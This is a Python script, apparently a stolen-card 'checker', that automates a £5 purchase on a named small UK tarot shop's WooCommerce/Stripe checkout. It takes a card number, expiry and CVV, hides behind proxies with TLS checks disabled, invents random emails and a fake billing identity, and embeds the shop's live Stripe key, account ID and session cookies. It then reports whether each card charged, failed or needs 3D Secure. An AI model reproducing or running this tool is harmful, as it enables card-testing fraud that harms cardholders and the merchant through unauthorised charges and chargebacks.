import requests,re,random,string,time
from datetime import datetime
import urllib3
from proxy import proxies
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def generate_email():
    # List of common email domains
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com']
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_boundary():
    return 'WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

async def stripe_charge2(cc,mm,yy,cvv):

    if len(yy) == 4:
        yy = yy[-2:]
    boundary = generate_boundary()
    proxy = proxies()
    r = requests.Session()

    r.proxies = proxy
    r.verify = False

    email = generate_email()
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': f'multipart/form-data; boundary=----{boundary}',
    'origin': 'https://energetictarot.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://energetictarot.co.uk/product/tarot-for-reconnection-workbook/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
}

# Define the form-data using the generated boundary
    data = f"""
------{boundary}
Content-Disposition: form-data; name="quantity"

1
------{boundary}
Content-Disposition: form-data; name="add-to-cart"

221920
------{boundary}
Content-Disposition: form-data; name="gtm4wp_product_data"

{{"internal_id":221920,"item_id":221920,"item_name":"Tarot For Reconnection Workbook","sku":221920,"price":5,"stocklevel":null,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Tarot Workbooks","id":221920}}
------{boundary}--
""".encode('utf-8')

# Send the POST request with headers and form-data
    response = r.post(
    'https://energetictarot.co.uk/product/tarot-for-reconnection-workbook/',
    headers=headers,
    data=data
)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        #'cookie': '_ga=GA1.1.861102655.1727961898; tk_ai=HokX2J7ogZSV2TJfMz1uK9Ez; tk_or=%22%22; tk_lr=%22%22; __stripe_mid=f1564678-20f7-497e-80cc-a65c72861edfc55fec; fd-form-66f9bf367fb0f56f0914ca22-dismissed-count=2; lp_session_guest=g-6704dececff13; pmpro_visit=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-08%2006%3A57%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fenergetictarot.co.uk%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-08%2006%3A57%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fenergetictarot.co.uk%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; __stripe_sid=f4b29be4-4895-46e2-a39c-202204d2bca4367a07; tk_r3d=%22%22; woocommerce_items_in_cart=1; woocommerce_cart_hash=7d82853610ab04259250946388f71b32; wp_woocommerce_session_47f7bc8fffc203a2d62bd8d779e1cb34=t_ca65d517f4e1370521a0642678913c%7C%7C1728545253%7C%7C1728541653%7C%7C75c6d95a5ddbc6b292bc9193f605156b; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fenergetictarot.co.uk%2Fcart%2F; _ga_1PFCDFQKH8=GS1.1.1728372434.8.1.1728372549.58.0.0; tk_qs=',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://energetictarot.co.uk/cart/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    response = r.get('https://energetictarot.co.uk/checkout/', headers=headers)
    try:
        nonce = re.findall(r'"nonce":\s*"([a-f0-9]+)"', response.text)[0]
    except:
        return 'Order not created. Please try again later.'
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        "billing_details[name]": "Albedo Jones",
        "billing_details[email]": email,
        "billing_details[phone]": "",
        "billing_details[address][city]": "West Anneberg",
        "billing_details[address][country]": "GB",
        "billing_details[address][line1]": "Flat 27x Hobbs hill",
        "billing_details[address][line2]": "",
        "billing_details[address][postal_code]": "M2W 8LE",
        "billing_details[address][state]": "",
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/a8a0661e95; stripe-js-v3/a8a0661e95; payment-element; deferred-intent",
        "referrer": "https://energetictarot.co.uk",
        "client_attribution_metadata[client_session_id]": "021743d1-5d82-4ad7-b0a1-8b50de7ee361",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "guid": "a3b0ef5c-15fa-46a9-bda4-16cdd3608e2b98ead9",
        "muid": "f1564678-20f7-497e-80cc-a65c72861edfc55fec",
        "sid": "f4b29be4-4895-46e2-a39c-202204d2bca4367a07",
        "key": "pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn",
        "_stripe_account": "acct_1OgskcFyDtdkKBns"
    }

    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
    try:
        pm = response['id']
    except:
        return 'Card Number Invalid'
    time.sleep(1)
    headers = {
        'accept': 'application/json, */*;q=0.1',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        # 'cookie': '_ga=GA1.1.861102655.1727961898; tk_ai=HokX2J7ogZSV2TJfMz1uK9Ez; tk_or=%22%22; tk_lr=%22%22; __stripe_mid=f1564678-20f7-497e-80cc-a65c72861edfc55fec; fd-form-66f9bf367fb0f56f0914ca22-dismissed-count=2; lp_session_guest=g-6704dececff13; pmpro_visit=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-08%2006%3A57%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fenergetictarot.co.uk%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-08%2006%3A57%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fenergetictarot.co.uk%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; __stripe_sid=f4b29be4-4895-46e2-a39c-202204d2bca4367a07; tk_r3d=%22%22; woocommerce_items_in_cart=1; woocommerce_cart_hash=7d82853610ab04259250946388f71b32; wp_woocommerce_session_47f7bc8fffc203a2d62bd8d779e1cb34=t_ca65d517f4e1370521a0642678913c%7C%7C1728545253%7C%7C1728541653%7C%7C75c6d95a5ddbc6b292bc9193f605156b; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fenergetictarot.co.uk%2Fcheckout%2F; tk_qs=; _ga_1PFCDFQKH8=GS1.1.1728372434.8.1.1728372905.60.0.0',
        'nonce': '9f31975437',
        'origin': 'https://energetictarot.co.uk',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://energetictarot.co.uk/checkout/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-wp-nonce': nonce,
    }

    params = {
        '_locale': 'user',
    }

    json_data = {
        'additional_fields': {},
        'billing_address': {
            'first_name': 'Albedo',
            'last_name': 'Jones',
            'company': '',
            'address_1': 'Flat 27x Hobbs hill',
            'address_2': '',
            'city': 'West Anneberg',
            'state': '',
            'postcode': 'M2W 8LE',
            'country': 'GB',
            'email': email,
            'phone': '',
        },
        'create_account': False,
        'customer_note': '',
        'customer_password': '',
        'extensions': {
            'woocommerce/order-attribution': {
                'source_type': 'typein',
                'referrer': '(none)',
                'utm_campaign': '(none)',
                'utm_source': '(direct)',
                'utm_medium': '(none)',
                'utm_content': '(none)',
                'utm_id': '(none)',
                'utm_term': '(none)',
                'utm_source_platform': '(none)',
                'utm_creative_format': '(none)',
                'utm_marketing_tactic': '(none)',
                'session_entry': 'https://energetictarot.co.uk/cart/',
                'session_start_time': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
                'session_pages': '6',
                'session_count': '1',
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            },
        },
        'payment_method': 'woocommerce_payments',
        'payment_data': [
            {
                'key': 'payment_method',
                'value': 'woocommerce_payments',
            },
            {
                'key': 'wcpay-payment-method',
                'value': pm,
            },
            {
                'key': 'wcpay-fraud-prevention-token',
                'value': '',
            },
            {
                'key': 'wcpay-fingerprint',
                'value': 'c9bc30613c42407f54b1a68bcc8defb6',
            },
            {
                'key': 'wc-woocommerce_payments-new-payment-method',
                'value': False,
            },
        ],
    }

    response = r.post(
        'https://energetictarot.co.uk/wp-json/wc/store/v1/checkout',
        params=params,
        headers=headers,
        json=json_data,
    )
    if response.status_code != 200 and response.json().get('status') == "failed":
        payment_result = response.json().get('payment_result', {})
        payment_details = payment_result.get('payment_details', [])
        for detail in payment_details:
            if detail.get('key') == 'errorMessage':
                error_message = detail.get('value', '')
                
                # Remove "Error: " prefix if it exists
                if error_message.startswith("Error: "):
                    error_message = error_message.replace("Error: ", "")
                    return error_message

    elif response.status_code != 200 and response.json().get('status') == "pending":
        return '3D Secure authentication required'
    elif response.status_code == 200 or response.json().get('status') == "success" or response.json().get('status') == "succeeded":
        return 'Charged £5'
    else:
        return 'An error occurred'